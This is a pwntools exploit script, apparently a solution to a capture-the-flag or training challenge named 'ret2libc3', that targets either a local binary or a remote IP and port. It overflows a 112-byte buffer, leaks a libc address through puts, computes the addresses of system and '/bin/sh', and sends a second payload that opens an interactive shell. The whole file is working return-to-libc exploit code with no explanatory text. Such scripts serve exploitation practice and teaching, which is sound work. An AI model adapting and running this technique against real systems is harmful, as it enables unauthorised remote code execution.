from pwn import *

local = 1
pc = './ret2libc3'
aslr = True
context.log_level = 'debug'  
context.arch = 'i386' 

libc = ELF('/lib/i386-linux-gnu/libc.so.6')
ret2libc3 = ELF('./ret2libc3')

if local==1:
    p = process(pc, aslr=aslr)
else:
    remote_addr = ['111.198.29.45', 39802]
    p = remote(remote_addr[0], remote_addr[1])

ru = lambda x : p.recvuntil(x)
rud = lambda x : p.recvuntil(x, drop=True)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a, b)
sla = lambda a,b : p.sendlineafter(a, b)
pi = lambda : p.interactive()

def dbg(b=""):
    gdb.attach(p, b)  
    raw_input()

def lg(s, addr):
    log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, addr))

def raddr(a=6):
    if(a==6):
        return u64(rv(a).ljust(8, b'\x00'))
    else:
        return u64(rl().strip(b'\n').ljust(8, b'\x00'))

if __name__ == '__main__':
    puts_plt = ret2libc3.plt['puts']
    libc_start_main_got = ret2libc3.got['__libc_start_main']
    start_addr = ret2libc3.symbols['_start']
    lg('start_addr', start_addr)

    payload = b'a' * 112
    payload += p32(puts_plt)
    payload += p32(start_addr)
    payload += p32(libc_start_main_got)
    sl(payload)  

    ru(b'Can you find it !?')

    libc_start_main_addr = u32(p.recv(4))
    lg('libc_start_main_addr', libc_start_main_addr)

    libc_base_addr = libc_start_main_addr - libc.symbols['__libc_start_main']
    lg('libc_base_addr', libc_base_addr)

    system_addr = libc_base_addr + libc.symbols['system']

    binsh_offset = next(libc.search(b'/bin/sh\x00'))
    binsh_addr = libc_base_addr + binsh_offset
    
    lg('system_addr', system_addr)
    lg('binsh_addr', binsh_addr)

    payload2 = b'a' * 112
    payload2 += p32(system_addr)
    payload2 += p32(0xdeadbeef)  
    payload2 += p32(binsh_addr)  
    
    sl(payload2)
    pi()